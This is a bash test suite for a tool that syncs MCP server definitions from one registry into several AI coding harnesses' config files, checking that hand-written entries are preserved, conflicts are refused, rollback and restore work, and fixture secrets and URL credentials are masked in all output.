#!/usr/bin/env bash
# Tests for bin/harness-mcp-sync — SSOT -> per-harness MCP config sync.
# Self-contained: temp HOME + temp state dir + a FIXTURE registry (never the real
# harnesses/ configs, never the real HOME). Asserts every safety rule of the tool,
# and that the fixture secret never appears in ANY captured stdout/stderr.
# Run: bash bin/tests/harness-mcp-sync.test.sh
set -uo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
BIN="$DIR/../harness-mcp-sync"

pass=0 ; fail=0
ok() { pass=$((pass + 1)); printf '  \xe2\x9c\x93 %s\n' "$1"; }
no() { fail=$((fail + 1)); printf '  \xe2\x9c\x97 %s\n      got: [%s]\n' "$1" "$2"; }
has()  { case "$2" in *"$1"*) ok "$3" ;; *) no "$3" "$2" ;; esac; }
hasnt(){ case "$2" in *"$1"*) no "$3" "$2" ;; *) ok "$3" ;; esac; }
eq()   { [ "$1" = "$2" ] && ok "$3" || no "$3" "got=[$2] want=[$1]"; }
sum()  { if [ -e "$1" ]; then shasum -a 256 "$1" | cut -d' ' -f1; else echo ABSENT; fi; }
mode() { stat -f '%Lp' "$1" 2>/dev/null || stat -c '%a' "$1"; }

printf 'harness-mcp-sync.test.sh\n'

REAL_HOME="$HOME"
T="$(mktemp -d 2>/dev/null || mktemp -d -t hms)"
trap 'rm -rf "$T"' EXIT
export HOME="$T/home"; mkdir -p "$HOME"
unset XDG_STATE_HOME
SD="$T/state"; REG="$T/reg"; mkdir -p "$REG"
ALLOUT="$T/all-output.log"; : > "$ALLOUT"
export FIXSECRET="sekret-VALUE-7f3a9c1e2d"   # fixture secret: must never be printed
export OTHERVAL="plain-env-value-42"

# Real config paths must not change (snapshot a few mtimes/checksums)
REAL_SNAP="$T/real.snap"
# (~/.claude.json is excluded: live Claude Code sessions rewrite it concurrently.)
for f in "$REAL_HOME/.codex/config.toml" "$REAL_HOME/.gemini/settings.json" \
         "$REAL_HOME/.cursor/mcp.json" "$REAL_HOME/.config/opencode/opencode.json"; do
  echo "$f $(sum "$f")" >> "$REAL_SNAP"
done

# ---------------------------------------------------------------- fixture registry
mk() { # id format key style path headers disable_field semantics confidence [extra-yaml]
  cat > "$REG/$1.yaml" <<EOF
schema: 1
id: $1
name: Fixture $1
kind: cli
detect: {commands: [], paths: ["~/.$1"]}
mcp:
  supported: true
  config_paths: [{path: "$5", scope: user}]
  format: $2
  key_path: [$3]
  entry_style: $4
  transports: [stdio, streamable-http, http, sse]
  supports: {headers: $6, env: true, disable: $( [ "$7" = null ] && echo false || echo true ), disable_field: $7, disable_semantics: $8}
  cli: null
update: {version_cmd: "echo fixture-$1 1.0", update_cmd: "true-but-never-run"}
last_verified: '2026-09-24'
confidence: $9
skip_reason: null
${10:-}
EOF
  mkdir -p "$HOME/.$1"
}
mk hjson   json  mcpServers      mcpservers-json     "~/.hjson/mcp.json"      true  disabled null  high
sed -i.bak 's/disable_semantics: null/disable_semantics: disabled-bool/' "$REG/hjson.yaml" && rm -f "$REG/hjson.yaml.bak"
mk htoml   toml  mcp_servers     codex               "~/.htoml/config.toml"   true  enabled  enabled-bool high
mk hgrok   toml  mcp_servers     grok-toml           "~/.hgrok/config.toml"   true  enabled  enabled-bool high
mk hnohdr  json  mcpServers      mcpservers-json     "~/.hnohdr/mcp.json"     false null     null  high
mk hlow    json  mcpServers      mcpservers-json     "~/.hlow/mcp.json"       true  null     null  low
mk hjsonc  jsonc servers         vscode-servers      "~/.hjsonc/mcp.json"     true  null     null  high
mk hgit    json  mcpServers      mcpservers-json     "~/gitrepo/mcp.json"     true  null     null  high
mk hopen   json  mcp             opencode            "~/.hopen/opencode.json" true  enabled  enabled-bool high
mk hgoose  yaml  extensions      goose-extensions    "~/.hgoose/config.yaml"  true  enabled  enabled-bool high
mk hgem    json  mcpServers      mcpservers-json     "~/.hgem/settings.json"  true  null     null  high \
  ""
python3 - "$REG/hgem.yaml" <<'EOF'
import sys,re
p=sys.argv[1]; t=open(p).read()
t=t.replace("  entry_style: mcpservers-json\n","  entry_style: mcpservers-json\n  entry_overrides:\n    url_field: {streamable-http: httpUrl, sse: url}\n    type_values: {stdio: null, streamable-http: null, sse: null}\n")
open(p,"w").write(t)
EOF
mk hgtrk   json  mcpServers      mcpservers-json     "~/gitrepo/tracked.json" true  null     null  high
mk hgign   json  mcpServers      mcpservers-json     "~/gitrepo/ignored.json" true  null     null  high
mkdir -p "$HOME/gitrepo" && git -C "$HOME/gitrepo" init -q >/dev/null 2>&1
printf 'ignored.json\n' > "$HOME/gitrepo/.gitignore"
echo '{"mcpServers":{}}' > "$HOME/gitrepo/tracked.json"
git -C "$HOME/gitrepo" add tracked.json .gitignore >/dev/null 2>&1
git -C "$HOME/gitrepo" -c user.email=t@t -c user.name=t commit -qm init >/dev/null 2>&1

SSOT="$T/ssot.json"
cat > "$SSOT" <<'EOF'
{"schema":1,"servers":{
 "cf-remote":{"transport":"streamable-http","url":"https://mcp.example.test/mcp",
   "headers":{"Authorization":"Bearer ${FIXSECRET}"},"enabled":true,"replaces":["cf-legacy"]},
 "opt-remote":{"transport":"streamable-http","url":"https://opt.example.test/mcp","enabled":false},
 "local-tool":{"transport":"stdio","command":"npx","args":["-y","pkg"],"env":{"K":"${OTHERVAL}"}}}}
EOF

run() { # captures combined output into $o, exit into $rc, appends to ALLOUT
  o="$("$BIN" "$@" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?
  printf '%s\n' "$o" >> "$ALLOUT"
}

# ---------------------------------------------------------------- pre-existing hand-written content
cat > "$HOME/.hjson/mcp.json" <<'EOF'
{
  "theme": "dark",
  "mcpServers": {
    "hand-written": {"command": "hand", "args": ["x"]},
    "cf-legacy": {"type": "http", "url": "https://old.example.test"}
  },
  "zzz": [1, 2, 3]
}
EOF
cat > "$HOME/.htoml/config.toml" <<'EOF'
# user comment at top
model = "gpt-x"

[mcp_servers.hand]
command = "hand"
args = ["a"]

[profiles.work]
model = "other"
EOF
TOML_PREFIX="$(sed -n '1,7p' "$HOME/.htoml/config.toml")"

# ---------------------------------------------------------------- usage
run bogus-mode; eq 2 "$rc" 'unknown mode exits 2'
run plan --harness hjson; eq 2 "$rc" 'plan without --ssot exits 2'
run plan --ssot "$SSOT" --harness nope; eq 2 "$rc" 'unknown harness id exits 2'
has 'research it, then add harnesses/<id>.yaml with confidence: low' "$o" 'unknown harness: error tells how to onboard it'

# ---------------------------------------------------------------- explain / inventory / doctor
run explain --json; has '"hjson"' "$o" 'explain lists fixture harnesses'
run inventory --harness hjson; has 'hand-written' "$o" 'inventory lists unmanaged names'
run doctor --harness hgit --json; has '"git": "untracked"' "$o" 'doctor: untracked-not-ignored config flagged'
has '"status": "warn"' "$o" 'doctor: untracked-not-ignored is warn'
run doctor --harness hgign; has 'in-git-repo(ignored)' "$o" 'doctor: ignored config is ok-with-note'
run doctor --harness hgtrk --json; has '"git": "tracked"' "$o" 'doctor: tracked config flagged'

# ---------------------------------------------------------------- plan never writes
B1="$(sum "$HOME/.hjson/mcp.json")"; B2="$(sum "$HOME/.htoml/config.toml")"
run plan --ssot "$SSOT" --json
eq "$B1" "$(sum "$HOME/.hjson/mcp.json")" 'plan leaves JSON untouched'
eq "$B2" "$(sum "$HOME/.htoml/config.toml")" 'plan leaves TOML untouched'
[ -e "$HOME/.hopen/opencode.json" ] && no 'plan creates no new files' exists || ok 'plan creates no new files'
has 'remove' "$o" 'plan proposes replaced legacy removal'
has 'replaced-by cf-remote' "$o" 'replaces reported as remove(replaced-by X)'
has 'lacks header support' "$o" 'no-header harness: remote server skipped + warned'
has 'confidence low' "$o" 'low-confidence harness is plan-only with reason'
has 'git work tree' "$o" 'in-git config: secret server skipped with reason'
has '«secret»' "$o" 'plan masks secret values'
hasnt 'sha256:' "$o" 'mask carries no hash (no brute-force oracle)'

# ---------------------------------------------------------------- apply
run apply --ssot "$SSOT" --json --adopt cf-legacy
TS="$(printf '%s' "$o" | python3 -c 'import sys,json; print(json.load(sys.stdin)["backup_ts"] or "")' 2>/dev/null)"
[ -n "$TS" ] && ok "apply reports a backup ts" || no 'apply reports a backup ts' "$o"
eq 600 "$(mode "$HOME/.hjson/mcp.json")" 'written file mode 600'
eq 700 "$(mode "$SD/backups")" 'backups dir mode 700'
BK="$(ls "$SD/backups/$TS/hjson/mcp.json" 2>/dev/null)"
[ -n "$BK" ] && eq 600 "$(mode "$BK")" 'backup file mode 600' || no 'backup exists' "$TS"

J="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); m=d["mcpServers"]; print(d["theme"], d["zzz"], sorted(m), m["hand-written"], m["cf-remote"]["type"], m["opt-remote"].get("disabled"))' "$HOME/.hjson/mcp.json")"
has "dark [1, 2, 3]" "$J" 'JSON: hand-written sibling keys preserved'
has "{'command': 'hand', 'args': ['x']}" "$J" 'JSON: unmanaged entry preserved'
hasnt "cf-legacy" "$J" 'JSON: replaced legacy entry removed'
has "http True" "$J" 'JSON: disabled server written with disabled=true where supported'

eq "$TOML_PREFIX" "$(sed -n '1,7p' "$HOME/.htoml/config.toml")" 'TOML: hand-written prefix byte-preserved'
T1="$(python3 -c 'import tomllib,sys; d=tomllib.load(open(sys.argv[1],"rb")); m=d["mcp_servers"]; print(sorted(m), m["opt-remote"]["enabled"], m["cf-remote"]["http_headers"]["Authorization"].startswith("Bearer "), d["profiles"]["work"]["model"])' "$HOME/.htoml/config.toml" 2>&1)"
has "['cf-remote', 'hand', 'local-tool', 'opt-remote'] False True other" "$T1" 'TOML: surgical — managed tables added, others intact, enabled=false'
python3 -c 'import tomllib,sys; d=tomllib.load(open(sys.argv[1],"rb")); assert d["mcp_servers"]["cf-remote"]["headers"]["Authorization"].startswith("Bearer ")' "$HOME/.hgrok/config.toml" 2>/dev/null \
  && ok 'grok-toml: inline headers table' || no 'grok-toml: inline headers table' "$(cat "$HOME/.hgrok/config.toml" | sed "s/$FIXSECRET/X/g")"

N="$(python3 -c 'import json,sys; m=json.load(open(sys.argv[1])).get("mcpServers",{}); print(sorted(m))' "$HOME/.hnohdr/mcp.json" 2>&1)"
eq "['local-tool']" "$N" 'no-disable harness: disabled server omitted; header-less harness skips remote'
[ -e "$HOME/.hlow/mcp.json" ] && no 'low-confidence never applied' exists || ok 'low-confidence never applied'
hasnt "cf-remote" "$(cat "$HOME/gitrepo/mcp.json" 2>/dev/null)" 'in-git untracked-not-ignored: secret server refused'
hasnt "cf-remote" "$(cat "$HOME/gitrepo/tracked.json" 2>/dev/null)" 'in-git tracked: secret server refused'
hasnt "local-tool" "$(cat "$HOME/gitrepo/tracked.json" 2>/dev/null)" 'in-git tracked: placeholder-bearing env server also refused'
has "cf-remote" "$(cat "$HOME/gitrepo/ignored.json" 2>/dev/null)" 'in-git ignored: secret server applied'
G="$(python3 -c 'import json,sys; m=json.load(open(sys.argv[1]))["mcpServers"]["cf-remote"]; print(sorted(m))' "$HOME/.hgem/settings.json" 2>&1)"
eq "['headers', 'httpUrl']" "$G" 'entry_overrides: url_field httpUrl + type omitted'
O="$(python3 -c 'import json,sys; m=json.load(open(sys.argv[1]))["mcp"]; print(m["local-tool"]["command"], m["local-tool"]["type"], m["opt-remote"]["enabled"])' "$HOME/.hopen/opencode.json" 2>&1)"
eq "['npx', '-y', 'pkg'] local False" "$O" 'opencode: local command array + enabled=false'
Y="$(python3 -c 'import yaml,sys; m=yaml.safe_load(open(sys.argv[1]))["extensions"]; print(m["local-tool"]["cmd"], m["cf-remote"]["type"], m["opt-remote"]["enabled"])' "$HOME/.hgoose/config.yaml" 2>&1)"
eq "npx streamable_http False" "$Y" 'goose: yaml extensions rendered'

# ---------------------------------------------------------------- idempotency
run plan --ssot "$SSOT" --json
N2="$(printf '%s' "$o" | python3 -c 'import sys,json; r=json.load(sys.stdin); print(sum(1 for h in r if h["applicable"] for a in h["actions"] if a["action"] in ("add","update","remove")))' 2>&1)"
eq 0 "$N2" 'second plan is empty (idempotent)'
S1="$(sum "$HOME/.hjson/mcp.json")"; run apply --ssot "$SSOT"; eq "$S1" "$(sum "$HOME/.hjson/mcp.json")" 'second apply writes nothing'
run verify --ssot "$SSOT"; eq 0 "$rc" 'verify clean after apply'

# ---------------------------------------------------------------- conflict / adopt
python3 - "$HOME/.hjson/mcp.json" <<'EOF'
import json,sys; p=sys.argv[1]; d=json.load(open(p)); d["mcpServers"]["new-srv"]={"command":"mine"}; json.dump(d,open(p,"w"),indent=2)
EOF
chmod 600 "$HOME/.hjson/mcp.json"
SSOT2="$T/ssot2.json"
python3 - "$SSOT" "$SSOT2" <<'EOF'
import json,sys; d=json.load(open(sys.argv[1])); d["servers"]["new-srv"]={"transport":"stdio","command":"theirs"}; json.dump(d,open(sys.argv[2],"w"))
EOF
C0="$(sum "$HOME/.hjson/mcp.json")"
run apply --ssot "$SSOT2" --harness hjson
eq 1 "$rc" 'apply with unmanaged same-name entry exits 1'
has 'conflict:unmanaged' "$o" 'unmanaged same-name entry reported as conflict'
eq mine "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["mcpServers"]["new-srv"]["command"])' "$HOME/.hjson/mcp.json")" 'conflicting entry not overwritten'
run apply --ssot "$SSOT2" --harness hjson --adopt new-srv
eq 0 "$rc" '--adopt resolves the conflict'
eq theirs "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["mcpServers"]["new-srv"]["command"])' "$HOME/.hjson/mcp.json")" 'adopted entry now owned + updated'

# ---------------------------------------------------------------- rollback after failed parse-back
mk hrb json mcpServers mcpservers-json "~/.hrb/mcp.json" true null null high
echo '{"keep": true, "mcpServers": {}}' > "$HOME/.hrb/mcp.json"; chmod 600 "$HOME/.hrb/mcp.json"
R0="$(sum "$HOME/.hrb/mcp.json")"
# Fault injected from the TEST side: import the script as a module and wrap its
# atomic_write so the target config gets corrupted bytes (the binary has no hook).
o="$(python3 - "$BIN" "$HOME/.hrb/mcp.json" apply --ssot "$SSOT" --harness hrb --registry "$REG" --state-dir "$SD" 2>&1 <<'PY'
import importlib.machinery, importlib.util, os, sys
path, target, argv = sys.argv[1], os.path.realpath(sys.argv[2]), sys.argv[3:]
loader = importlib.machinery.SourceFileLoader("hms", path)
spec = importlib.util.spec_from_loader("hms", loader)
hms = importlib.util.module_from_spec(spec)
loader.exec_module(hms)
real = hms.atomic_write
hits = []
def corrupting(p, data, mode=0o600):
    if os.path.realpath(p) == target and not hits:   # corrupt ONLY the apply write, not the restore
        hits.append(1)
        data = data[: len(data) // 2] + b"\x00"
    return real(p, data, mode)
hms.atomic_write = corrupting
sys.stdout, sys.stderr = hms.Redactor(sys.stdout), hms.Redactor(sys.stderr)
code = hms.run(argv)
sys.stdout.flush()
sys.exit(code)
PY
)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'corrupted write: apply exits 1'
has 'rolled-back' "$o" 'corrupted write: reported rolled-back'
eq "$R0" "$(sum "$HOME/.hrb/mcp.json")" 'corrupted write: original bytes restored'
hasnt 'hrb' "$(python3 -c 'import json,sys; print(list(json.load(open(sys.argv[1]))["files"]))' "$SD/manifest.json")" 'corrupted write: manifest not updated'

# ---------------------------------------------------------------- malformed TOML aborts pre-write
cp "$HOME/.htoml/config.toml" "$T/good.toml"
printf 'broken = [\n' >> "$HOME/.htoml/config.toml"
M0="$(sum "$HOME/.htoml/config.toml")"
run apply --ssot "$SSOT2" --harness htoml
[ "$rc" -ne 0 ] && ok 'malformed TOML: apply exits non-zero' || no 'malformed TOML: apply exits non-zero' "$rc"
eq "$M0" "$(sum "$HOME/.htoml/config.toml")" 'malformed TOML: file unchanged'
cp "$T/good.toml" "$HOME/.htoml/config.toml"; chmod 600 "$HOME/.htoml/config.toml"

# ---------------------------------------------------------------- commented jsonc refused
cat > "$HOME/.hjsonc/mcp.json" <<'EOF'
{
  // user comment
  "servers": {},
  "inputs": [],
}
EOF
J0="$(sum "$HOME/.hjsonc/mcp.json")"
run apply --ssot "$SSOT" --harness hjsonc
eq 1 "$rc" 'commented jsonc: apply refused (exit 1)'
has 'allow-comment-loss' "$o" 'commented jsonc: reason names the flag'
eq "$J0" "$(sum "$HOME/.hjsonc/mcp.json")" 'commented jsonc: file unchanged'
run apply --ssot "$SSOT" --harness hjsonc --allow-comment-loss
eq 0 "$rc" 'commented jsonc: applied with --allow-comment-loss'
eq "stdio" "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["servers"]["local-tool"]["type"])' "$HOME/.hjsonc/mcp.json")" 'vscode-servers: stdio type emitted'
hasnt 'opt-remote' "$(cat "$HOME/.hjsonc/mcp.json")" 'vscode (no disable flag): disabled server omitted'

# ---------------------------------------------------------------- verify detects drift
chmod 644 "$HOME/.hjson/mcp.json"
run verify --ssot "$SSOT2" --harness hjson; eq 1 "$rc" 'verify: mode != 600 is drift'
has '0o644' "$o" 'verify names the bad mode'
chmod 600 "$HOME/.hjson/mcp.json"
python3 - "$HOME/.hjson/mcp.json" <<'EOF'
import json,sys; p=sys.argv[1]; d=json.load(open(p)); d["mcpServers"]["cf-remote"]["headers"]["Authorization"]="Bearer tampered-token-xyz"; json.dump(d,open(p,"w"),indent=2)
EOF
chmod 600 "$HOME/.hjson/mcp.json"
run verify --ssot "$SSOT2"; eq 1 "$rc" 'verify: value drift detected'
has 'drift vs SSOT' "$o" 'verify reports SSOT drift'
has 'differing secret hashes' "$o" 'verify: same-secret-same-hash across harnesses'
hasnt 'tampered-token-xyz' "$o" 'verify never prints config header values'

# ---------------------------------------------------------------- restore round-trip
RB="$(sum "$BK")"
run restore "$TS" --harness hjson
eq 0 "$rc" 'restore exits 0'
eq "$RB" "$(sum "$HOME/.hjson/mcp.json")" 'restore round-trips the pre-apply bytes'
has 'cf-legacy' "$(cat "$HOME/.hjson/mcp.json")" 'restored file has original legacy entry'
run restore 19990101T000000Z; eq 2 "$rc" 'restore of unknown ts exits 2'

# ---------------------------------------------------------------- resolver
SSOT3="$T/ssot3.json"
echo '{"schema":1,"servers":{"v":{"transport":"streamable-http","url":"https://v.test","headers":{"A":"op://vault/item/field"}}}}' > "$SSOT3"
run plan --ssot "$SSOT3" --harness hjson; eq 2 "$rc" 'op:// without --resolver is a hard error'
has 'needs --resolver' "$o" 'op:// error explains'
RES="$T/resolver.sh"; printf '#!/bin/sh\nprintf "%%s" "$FIXSECRET"\n' > "$RES"; chmod +x "$RES"
run plan --ssot "$SSOT3" --harness hjson --resolver "$RES"; eq 0 "$rc" 'resolver executable resolves op:// refs'
unset OTHERVAL; run plan --ssot "$SSOT" --harness hjson; eq 2 "$rc" 'missing env placeholder is a hard error'
export OTHERVAL="plain-env-value-42"

# ---------------------------------------------------------------- update (suggest only)
run update --harness hjson --json; has 'fixture-hjson 1.0' "$o" 'update prints version from version_cmd'
has 'true-but-never-run' "$o" 'update prints update_cmd as suggestion'

# ---------------------------------------------------------------- URL-embedded credentials masked in ALL modes
URLOUT="$T/url-output.log"; : > "$URLOUT"
C_USER="Pa55wordCRED9x"; C_QUERY="QueryTok3nCRED7y"; C_SEG="Zt9xQ2pLm8vK3rN7wB4yH6cD1fG5jA0e"; C_UNM="UnmanagedS3cretCRED"
mk hurl json mcpServers mcpservers-json "~/.hurl/mcp.json" true disabled disabled-bool high
printf '{"mcpServers": {"legacy-unmanaged": {"type": "http", "url": "https://bob:%s@legacy.cred.test/mcp?token=%s"}}}\n' "$C_UNM" "$C_UNM" > "$HOME/.hurl/mcp.json"
chmod 600 "$HOME/.hurl/mcp.json"
SSOTU="$T/ssot-url.json"
printf '{"schema":1,"servers":{"u-userinfo":{"transport":"streamable-http","url":"https://alice:%s@mcp.cred.test/mcp"},"u-query":{"transport":"streamable-http","url":"https://mcp.cred.test/mcp?api_key=%s&region=eu"},"u-path":{"transport":"streamable-http","url":"https://mcp.cred.test/s/%s/mcp"}}}\n' "$C_USER" "$C_QUERY" "$C_SEG" > "$SSOTU"
urun() { o="$("$BIN" "$@" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$URLOUT"; printf '%s\n' "$o" >> "$ALLOUT"; }
urun plan --ssot "$SSOTU" --harness hurl --json;  has 'mcp.cred.test' "$o" 'url mask: host stays visible (plan)'
has '«masked»@mcp.cred.test' "$o" 'url mask: userinfo masked'
has 'api_key=«masked»&region=eu' "$o" 'url mask: secret query param masked, others kept'
has '/s/«masked»/mcp' "$o" 'url mask: high-entropy path segment masked'
urun plan --ssot "$SSOTU" --harness hurl
urun inventory --harness hurl --json
urun inventory --harness hurl
urun doctor --harness hurl --json
urun explain --harness hurl --json
urun apply --ssot "$SSOTU" --harness hurl --json
urun verify --ssot "$SSOTU" --harness hurl --json
urun verify --ssot "$SSOT" --harness hurl
urun plan --ssot "$SSOTU" --harness "https://eve:$C_USER@bad.cred.test/x"; eq 2 "$rc" 'forced error path (unknown harness = URL) exits 2'
has 'bad.cred.test' "$o" 'forced error path: host still visible'
printf '{"schema":1,"servers":{"https://x:%s@err.cred.test/?token=%s":{"transport":"stdio","command":"x"}}}\n' "$C_USER" "$C_QUERY" > "$T/ssot-bad.json"
urun plan --ssot "$T/ssot-bad.json" --harness hurl; eq 2 "$rc" 'forced error path (invalid server name = URL) exits 2'
LEAK=""
for c in "$C_USER" "$C_QUERY" "$C_SEG" "$C_UNM"; do grep -q "$c" "$URLOUT" && LEAK="$LEAK $c"; done
eq "" "$LEAK" 'url mask: no raw URL credential in any mode (plan/inventory/doctor/explain/apply/verify/errors)'
has "$C_USER" "$(cat "$HOME/.hurl/mcp.json")" 'url mask is output-only: config file holds the real URL'

# ---------------------------------------------------------------- red-team regressions F1-F7
# F1: secret with '"', '\' and TAB must not survive JSON serialization (header AND --key=${X} arg)
export QSECRET="$(printf 'q"uo\\\\te\tTAB-9f8e7d')"
mk hq json mcpServers mcpservers-json "~/.hq/mcp.json" true null null high
SSOTQ="$T/ssot-q.json"
cat > "$SSOTQ" <<'EOF'
{"schema":1,"servers":{
 "q-remote":{"transport":"streamable-http","url":"https://q.example.test/mcp","headers":{"X-Key":"${QSECRET}"}},
 "q-local":{"transport":"stdio","command":"tool","args":["--key=${QSECRET}","-v"]}}}
EOF
QOUT="$T/q-output.log"; : > "$QOUT"
qrun() { o="$("$BIN" "$@" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$QOUT"; printf '%s\n' "$o" >> "$ALLOUT"; }
qrun plan --ssot "$SSOTQ" --harness hq --json
qrun apply --ssot "$SSOTQ" --harness hq --json
eq 0 "$rc" 'F1: apply with quote/backslash/tab secret succeeds'
qrun plan --ssot "$SSOTQ" --harness hq
qrun verify --ssot "$SSOTQ" --harness hq --json
Q="$(python3 - "$QOUT" <<'PY'
import json,os,sys
v=os.environ["QSECRET"]; txt=open(sys.argv[1],encoding="utf-8").read()
forms={v, json.dumps(v)[1:-1], json.dumps(v,ensure_ascii=False)[1:-1], "TAB-9f8e7d"}
print(" ".join(sorted(repr(f) for f in forms if f in txt)))
PY
)"
eq "" "$Q" 'F1: raw + JSON-escaped secret forms absent from plan/apply/verify output'
has '«secret»' "$(cat "$QOUT")" 'F1: --key=${X} arg value masked in preview'
eq "$QSECRET" "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["mcpServers"]["q-remote"]["headers"]["X-Key"], end="")' "$HOME/.hq/mcp.json")" 'F1: config file holds the exact secret'

# F2: literal secrets (no placeholder) refused for tracked / untracked-not-ignored targets
SSOTL="$T/ssot-lit.json"
cat > "$SSOTL" <<'EOF'
{"schema":1,"servers":{
 "lit-hdr":{"transport":"streamable-http","url":"https://l.example.test/mcp","headers":{"Authorization":"Bearer literal-abc123"}},
 "lit-arg":{"transport":"stdio","command":"tool","args":["--api-key","literalvalue99"]},
 "lit-argeq":{"transport":"stdio","command":"tool","args":["--token=literalvalue98"]},
 "lit-url":{"transport":"streamable-http","url":"https://u:pw9876543@l.example.test/mcp"},
 "clean":{"transport":"stdio","command":"tool","args":["-v"]}}}
EOF
run apply --ssot "$SSOTL" --harness hgtrk,hgit
L="$(python3 -c 'import json,sys; print(sorted(json.load(open(sys.argv[1]))["mcpServers"]), sorted(json.load(open(sys.argv[2]))["mcpServers"]))' "$HOME/gitrepo/tracked.json" "$HOME/gitrepo/mcp.json" 2>&1)"
eq "['clean'] ['clean']" "$L" 'F2: literal header/arg/url secrets refused in tracked + untracked git files; clean server written'
hasnt 'literal' "$(cat "$HOME/gitrepo/tracked.json" "$HOME/gitrepo/mcp.json")" 'F2: no literal secret reached a git-visible file'

# F3: symlinked config — inside HOME written THROUGH (link kept); outside HOME refused; into git repo judged by target
mk hsym json mcpServers mcpservers-json "~/.hsym/mcp.json" true null null high
mkdir -p "$HOME/realcfg"; echo '{"mcpServers":{}}' > "$HOME/realcfg/mcp.json"; chmod 600 "$HOME/realcfg/mcp.json"
ln -s "$HOME/realcfg/mcp.json" "$HOME/.hsym/mcp.json"
run apply --ssot "$SSOT" --harness hsym
eq 0 "$rc" 'F3: symlink inside HOME: apply ok'
[ -L "$HOME/.hsym/mcp.json" ] && ok 'F3: symlink preserved (not replaced by a regular file)' || no 'F3: symlink preserved' "$(ls -l "$HOME/.hsym/mcp.json")"
has 'cf-remote' "$(cat "$HOME/realcfg/mcp.json")" 'F3: link target received the write'
mk hout json mcpServers mcpservers-json "~/.hout/mcp.json" true null null high
mkdir -p "$T/outside"; echo '{"mcpServers":{}}' > "$T/outside/mcp.json"; OUT0="$(sum "$T/outside/mcp.json")"
ln -s "$T/outside/mcp.json" "$HOME/.hout/mcp.json"
run apply --ssot "$SSOT" --harness hout
eq 1 "$rc" 'F3: symlink target outside HOME: apply refused (exit 1)'
has 'outside HOME' "$o" 'F3: refusal names the reason'
eq "$OUT0" "$(sum "$T/outside/mcp.json")" 'F3: outside target untouched'
mk hsg json mcpServers mcpservers-json "~/.hsg/mcp.json" true null null high
echo '{"mcpServers":{}}' > "$HOME/gitrepo/tracked2.json"
git -C "$HOME/gitrepo" add tracked2.json >/dev/null 2>&1; git -C "$HOME/gitrepo" -c user.email=t@t -c user.name=t commit -qm t2 >/dev/null 2>&1
ln -s "$HOME/gitrepo/tracked2.json" "$HOME/.hsg/mcp.json"
run apply --ssot "$SSOT" --harness hsg
hasnt 'cf-remote' "$(cat "$HOME/gitrepo/tracked2.json")" 'F3: symlink into a git repo: tracked target -> secret server refused'
[ -L "$HOME/.hsg/mcp.json" ] && ok 'F3: git-target symlink preserved' || no 'F3: git-target symlink preserved' x

# F4: owned entry hand-edited since apply -> conflict:modified-since-apply unless --adopt
mk hmod json mcpServers mcpservers-json "~/.hmod/mcp.json" true disabled disabled-bool high
run apply --ssot "$SSOT" --harness hmod
python3 - "$HOME/.hmod/mcp.json" <<'EOF'
import json,sys; p=sys.argv[1]; d=json.load(open(p)); d["mcpServers"]["local-tool"]["args"]=["--hand-tuned"]; json.dump(d,open(p,"w"),indent=2)
EOF
chmod 600 "$HOME/.hmod/mcp.json"; M1="$(sum "$HOME/.hmod/mcp.json")"
run apply --ssot "$SSOT" --harness hmod
eq 1 "$rc" 'F4: hand-edited owned entry: apply exits 1'
has 'conflict:modified-since-apply' "$o" 'F4: reported as conflict:modified-since-apply'
eq "$M1" "$(sum "$HOME/.hmod/mcp.json")" 'F4: hand edit not overwritten'
run apply --ssot "$SSOT" --harness hmod --adopt local-tool
eq 0 "$rc" 'F4: --adopt overwrites the hand-edited entry'
hasnt 'hand-tuned' "$(cat "$HOME/.hmod/mcp.json")" 'F4: adopted entry back to SSOT'

# F5: unmanaged legacy under replaces needs --adopt
mk hrep json mcpServers mcpservers-json "~/.hrep/mcp.json" true null null high
echo '{"mcpServers":{"cf-legacy":{"type":"http","url":"https://old.example.test"}}}' > "$HOME/.hrep/mcp.json"; chmod 600 "$HOME/.hrep/mcp.json"
run plan --ssot "$SSOT" --harness hrep
has 'remove(replaced-by cf-remote, needs --adopt cf-legacy)' "$o" 'F5: plan shows remove(replaced-by X, needs --adopt)'
run apply --ssot "$SSOT" --harness hrep
eq 1 "$rc" 'F5: unowned legacy: apply exits 1'
has 'cf-legacy' "$(cat "$HOME/.hrep/mcp.json")" 'F5: unowned legacy NOT removed without --adopt'
run apply --ssot "$SSOT" --harness hrep --adopt cf-legacy
hasnt 'cf-legacy' "$(cat "$HOME/.hrep/mcp.json")" 'F5: --adopt removes it'

# F6: TOML — full expected document validated in memory BEFORE any write (fault-injected from the test side)
mk htv toml mcp_servers codex "~/.htv/config.toml" true enabled enabled-bool high
printf 'model = "m"\n' > "$HOME/.htv/config.toml"; chmod 600 "$HOME/.htv/config.toml"; V0="$(sum "$HOME/.htv/config.toml")"
o="$(python3 - "$BIN" "$HOME/.htv/config.toml" apply --ssot "$SSOT" --harness htv --registry "$REG" --state-dir "$SD" 2>&1 <<'PY'
import importlib.machinery, importlib.util, os, sys
path, target, argv = sys.argv[1], os.path.realpath(sys.argv[2]), sys.argv[3:]
loader = importlib.machinery.SourceFileLoader("hms", path)
spec = importlib.util.spec_from_loader("hms", loader); hms = importlib.util.module_from_spec(spec); loader.exec_module(hms)
real_surg, real_write = hms.toml_surgical, hms.atomic_write
hms.toml_surgical = lambda *a, **k: real_surg(*a, **k) + '\n[mcp_servers.injected]\ncommand = "x"\n'  # parses, but wrong doc
def watch(p, data, mode=0o600):
    if os.path.realpath(p) == target:
        print("TARGET-WRITTEN")
    return real_write(p, data, mode)
hms.atomic_write = watch
sys.stdout, sys.stderr = hms.Redactor(sys.stdout), hms.Redactor(sys.stderr)
code = hms.run(argv); sys.stdout.flush(); sys.exit(code)
PY
)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'F6: TOML doc mismatch: apply refused'
has 'does not match the expected document' "$o" 'F6: refusal reason'
